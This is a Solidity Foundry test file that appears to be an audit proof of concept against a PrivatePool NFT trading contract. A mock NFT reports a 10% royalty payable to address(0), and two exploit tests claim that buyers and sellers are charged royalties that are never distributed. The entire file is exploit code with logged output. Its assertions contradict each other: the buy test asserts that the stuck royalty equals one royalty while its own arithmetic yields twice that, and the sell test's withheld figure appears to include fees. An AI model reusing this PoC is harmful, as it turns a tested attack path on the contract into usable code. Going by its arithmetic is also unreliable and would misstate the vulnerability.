// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../../src/PrivatePool.sol";
import "../../src/Factory.sol";
import "solmate/tokens/ERC20.sol";
import "solmate/tokens/ERC721.sol";
import "openzeppelin/interfaces/IERC2981.sol";

// Mock ERC20 token for testing
contract MockERC20 is ERC20 {
    constructor() ERC20("Mock Token", "MOCK", 18) {}
    
    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }
}

// Mock ERC721 NFT for testing
contract MockERC721 is ERC721 {
    uint256 private _tokenIdCounter;
    
    constructor() ERC721("Mock NFT", "MNFT") {}
    
    function mint(address to) public returns (uint256) {
        uint256 tokenId = _tokenIdCounter++;
        _mint(to, tokenId);
        return tokenId;
    }
    
    function tokenURI(uint256) public pure override returns (string memory) {
        return "";
    }
}

// Mock NFT with ERC2981 support that returns zero address as recipient
contract MockERC721WithZeroRecipient is ERC721, IERC2981 {
    uint256 private _tokenIdCounter;
    uint256 public royaltyPercentage = 1000; // 10%
    
    constructor() ERC721("Mock NFT Zero", "MNFTZ") {}
    
    function mint(address to) public returns (uint256) {
        uint256 tokenId = _tokenIdCounter++;
        _mint(to, tokenId);
        return tokenId;
    }
    
    function tokenURI(uint256) public pure override returns (string memory) {
        return "";
    }
    
    function supportsInterface(bytes4 interfaceId) public pure override(ERC721, IERC2981) returns (bool) {
        return interfaceId == type(IERC2981).interfaceId || interfaceId == 0x01ffc9a7 || interfaceId == 0x80ac58cd || interfaceId == 0x5b5e139f;
    }
    
    // Returns non-zero royalty fee but zero address as recipient
    function royaltyInfo(uint256, uint256 salePrice) external view override returns (address receiver, uint256 royaltyAmount) {
        receiver = address(0); // Zero address recipient
        royaltyAmount = (salePrice * royaltyPercentage) / 10000; // 10% royalty
    }
}

// Mock Factory
contract MockFactory is Factory {
    constructor() Factory() {}
    
    function setProtocolFeeRate(uint16 _protocolFeeRate) public {
        protocolFeeRate = _protocolFeeRate;
    }
}

// Mock Royalty Registry that returns the NFT address itself
contract MockRoyaltyRegistry {
    function getRoyaltyLookupAddress(address nft) external pure returns (address) {
        return nft;
    }
}

// Mock Stolen NFT Oracle
contract MockStolenNftOracle {
    function validateTokensAreNotStolen(address, uint256[] memory, IStolenNftOracle.Message[] memory) external pure {}
}

contract RoyaltyZeroRecipientExploitTest is Test {
    PrivatePool public pool;
    MockFactory public factory;
    MockRoyaltyRegistry public royaltyRegistry;
    MockStolenNftOracle public stolenNftOracle;
    MockERC20 public baseToken;
    MockERC721WithZeroRecipient public nft;
    
    address public poolOwner = address(0x1);
    address public buyer = address(0x2);
    address public seller = address(0x3);
    
    uint256[] public tokenIds;
    uint256[] public tokenWeights;
    PrivatePool.MerkleMultiProof public emptyProof;
    
    function setUp() public {
        // Deploy mock contracts
        factory = new MockFactory();
        royaltyRegistry = new MockRoyaltyRegistry();
        stolenNftOracle = new MockStolenNftOracle();
        baseToken = new MockERC20();
        nft = new MockERC721WithZeroRecipient();
        
        // Set protocol fee rate to 0 for simplicity
        factory.setProtocolFeeRate(0);
        
        // Deploy PrivatePool implementation
        PrivatePool implementation = new PrivatePool(
            address(factory),
            address(royaltyRegistry),
            address(stolenNftOracle)
        );
        
        // Deploy pool as minimal proxy
        vm.prank(poolOwner);
        pool = PrivatePool(payable(factory.create{value: 0}(
            address(baseToken),
            address(nft),
            100 ether, // virtualBaseTokenReserves
            10 ether,  // virtualNftReserves (10 NFTs worth)
            0,         // changeFee
            200,       // feeRate (2%)
            bytes32(0), // merkleRoot (no weights)
            false,     // useStolenNftOracle
            true,      // payRoyalties - ENABLED
            bytes32(0),
            new uint256[](0),
            0
        )));
        
        // Mint NFTs to the pool
        for (uint256 i = 0; i < 5; i++) {
            uint256 tokenId = nft.mint(address(pool));
            tokenIds.push(tokenId);
            tokenWeights.push(1e18);
        }
        
        // Fund the pool with base tokens
        baseToken.mint(address(pool), 1000 ether);
        
        // Setup buyer with tokens
        baseToken.mint(buyer, 1000 ether);
        vm.prank(buyer);
        baseToken.approve(address(pool), type(uint256).max);
        
        // Setup seller with NFTs
        for (uint256 i = 0; i < 3; i++) {
            nft.mint(seller);
        }
        vm.prank(seller);
        nft.setApprovalForAll(address(pool), true);
    }
    
    function testExploit_BuyWithZeroRecipientRoyalty() public {
        // STEP 1: Record initial balances
        uint256 buyerBalanceBefore = baseToken.balanceOf(buyer);
        uint256 poolBalanceBefore = baseToken.balanceOf(address(pool));
        
        console.log("=== Initial State ===");
        console.log("Buyer balance:", buyerBalanceBefore);
        console.log("Pool balance:", poolBalanceBefore);
        
        // STEP 2: Prepare buy parameters - buying 1 NFT
        uint256[] memory buyTokenIds = new uint256[](1);
        buyTokenIds[0] = tokenIds[0];
        
        uint256[] memory buyTokenWeights = new uint256[](1);
        buyTokenWeights[0] = 1e18;
        
        // STEP 3: Get quote to see expected costs
        (uint256 netInputAmount, uint256 feeAmount, uint256 protocolFeeAmount) = pool.buyQuote(1e18);
        
        console.log("\n=== Buy Quote ===");
        console.log("Net input amount (before royalty):", netInputAmount);
        console.log("Fee amount:", feeAmount);
        console.log("Protocol fee amount:", protocolFeeAmount);
        
        // STEP 4: Calculate expected royalty
        uint256 salePrice = (netInputAmount - feeAmount - protocolFeeAmount);
        uint256 expectedRoyalty = (salePrice * 1000) / 10000; // 10% royalty
        
        console.log("Sale price:", salePrice);
        console.log("Expected royalty (10%):", expectedRoyalty);
        
        // STEP 5: Execute buy
        vm.prank(buyer);
        (uint256 actualNetInput, , ) = pool.buy(buyTokenIds, buyTokenWeights, emptyProof);
        
        console.log("\n=== After Buy ===");
        console.log("Actual net input amount:", actualNetInput);
        
        // STEP 6: Verify balances after buy
        uint256 buyerBalanceAfter = baseToken.balanceOf(buyer);
        uint256 poolBalanceAfter = baseToken.balanceOf(address(pool));
        
        console.log("Buyer balance after:", buyerBalanceAfter);
        console.log("Pool balance after:", poolBalanceAfter);
        
        // STEP 7: Calculate actual amounts paid
        uint256 buyerPaid = buyerBalanceBefore - buyerBalanceAfter;
        uint256 poolReceived = poolBalanceAfter - poolBalanceBefore;
        
        console.log("\n=== Exploit Verification ===");
        console.log("Buyer paid:", buyerPaid);
        console.log("Pool received:", poolReceived);
        console.log("Difference (stuck royalty):", buyerPaid - poolReceived);
        
        // STEP 8: Verify the vulnerability
        // The buyer should have paid the royalty amount
        assertEq(actualNetInput, netInputAmount + expectedRoyalty, "Net input should include royalty");
        assertEq(buyerPaid, netInputAmount + expectedRoyalty, "Buyer should pay including royalty");
        
        // CRITICAL: The pool received the royalty but didn't distribute it
        // because recipient was address(0)
        assertEq(poolReceived, netInputAmount + expectedRoyalty, "Pool received royalty but didn't distribute");
        
        // The royalty amount is stuck in the pool
        uint256 stuckRoyalty = buyerPaid - (netInputAmount - expectedRoyalty);
        assertEq(stuckRoyalty, expectedRoyalty, "Royalty is stuck in pool");
        
        console.log("\n=== VULNERABILITY CONFIRMED ===");
        console.log("Buyer was charged royalty:", expectedRoyalty);
        console.log("Royalty recipient was address(0), so royalty was NOT distributed");
        console.log("Royalty is stuck in pool, causing loss to buyer");
        
        // Verify NFT was transferred to buyer
        assertEq(nft.ownerOf(buyTokenIds[0]), buyer, "NFT should be transferred to buyer");
    }
    
    function testExploit_SellWithZeroRecipientRoyalty() public {
        // STEP 1: Record initial balances
        uint256 sellerBalanceBefore = baseToken.balanceOf(seller);
        uint256 poolBalanceBefore = baseToken.balanceOf(address(pool));
        
        console.log("=== Initial State ===");
        console.log("Seller balance:", sellerBalanceBefore);
        console.log("Pool balance:", poolBalanceBefore);
        
        // STEP 2: Prepare sell parameters - selling 1 NFT
        uint256[] memory sellTokenIds = new uint256[](1);
        sellTokenIds[0] = 5; // NFT minted to seller
        
        uint256[] memory sellTokenWeights = new uint256[](1);
        sellTokenWeights[0] = 1e18;
        
        // STEP 3: Get quote to see expected proceeds
        (uint256 netOutputAmount, uint256 feeAmount, uint256 protocolFeeAmount) = pool.sellQuote(1e18);
        
        console.log("\n=== Sell Quote ===");
        console.log("Net output amount (before royalty):", netOutputAmount);
        console.log("Fee amount:", feeAmount);
        console.log("Protocol fee amount:", protocolFeeAmount);
        
        // STEP 4: Calculate expected royalty
        uint256 salePrice = (netOutputAmount + feeAmount + protocolFeeAmount);
        uint256 expectedRoyalty = (salePrice * 1000) / 10000; // 10% royalty
        
        console.log("Sale price:", salePrice);
        console.log("Expected royalty (10%):", expectedRoyalty);
        
        // STEP 5: Execute sell
        IStolenNftOracle.Message[] memory proofs = new IStolenNftOracle.Message[](0);
        vm.prank(seller);
        (uint256 actualNetOutput, , ) = pool.sell(sellTokenIds, sellTokenWeights, emptyProof, proofs);
        
        console.log("\n=== After Sell ===");
        console.log("Actual net output amount:", actualNetOutput);
        
        // STEP 6: Verify balances after sell
        uint256 sellerBalanceAfter = baseToken.balanceOf(seller);
        uint256 poolBalanceAfter = baseToken.balanceOf(address(pool));
        
        console.log("Seller balance after:", sellerBalanceAfter);
        console.log("Pool balance after:", poolBalanceAfter);
        
        // STEP 7: Calculate actual amounts
        uint256 sellerReceived = sellerBalanceAfter - sellerBalanceBefore;
        uint256 poolPaid = poolBalanceBefore - poolBalanceAfter;
        
        console.log("\n=== Exploit Verification ===");
        console.log("Seller received:", sellerReceived);
        console.log("Pool paid out:", poolPaid);
        console.log("Difference (withheld royalty):", poolPaid - sellerReceived);
        
        // STEP 8: Verify the vulnerability
        // The seller should receive less due to royalty deduction
        assertEq(actualNetOutput, netOutputAmount - expectedRoyalty, "Net output should exclude royalty");
        assertEq(sellerReceived, netOutputAmount - expectedRoyalty, "Seller receives less due to royalty");
        
        // CRITICAL: The pool kept the royalty amount instead of distributing it
        // because recipient was address(0)
        uint256 withheldRoyalty = (netOutputAmount + feeAmount + protocolFeeAmount) - poolPaid;
        assertEq(withheldRoyalty, expectedRoyalty, "Royalty was withheld from pool payout");
        
        console.log("\n=== VULNERABILITY CONFIRMED ===");
        console.log("Seller was charged royalty:", expectedRoyalty);
        console.log("Royalty recipient was address(0), so royalty was NOT distributed");
        console.log("Pool kept the royalty, causing loss to seller");
        
        // Verify NFT was transferred to pool
        assertEq(nft.ownerOf(sellTokenIds[0]), address(pool), "NFT should be transferred to pool");
    }
}